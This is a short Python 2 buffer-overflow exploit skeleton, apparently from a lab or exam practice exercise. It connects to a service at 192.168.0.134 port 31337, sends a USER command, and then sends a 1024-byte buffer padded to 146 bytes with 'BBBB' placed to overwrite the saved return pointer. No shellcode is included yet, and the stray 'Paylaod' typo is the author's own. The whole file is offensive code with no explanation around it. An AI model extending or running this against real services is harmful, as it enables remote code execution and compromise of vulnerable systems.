#!/usr/bin/env python2
import socket

RHOST = "192.168.0.134"
RPORT = 31337

buf_totlen=1024
esp=146
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A"*( esp- len(buf))  #padding
buf += "BBBB"			    #SRP Overwrite
buf += "CCCC"
#buf += "\xCC\xCC\xCC\xCC" 			    #ESP pointer
buf += "D"*(buf_totlen - len(buf))  #trailing
buf += "\n"

try:
    print"Sending Paylaod to remote server....."
    s.send('USER test\r\n') 
    s.recv(1024)
    s.send(buf)
    s.send('QUIT\r\n')
    s.close()

except: 
    print"Failed to connect/....."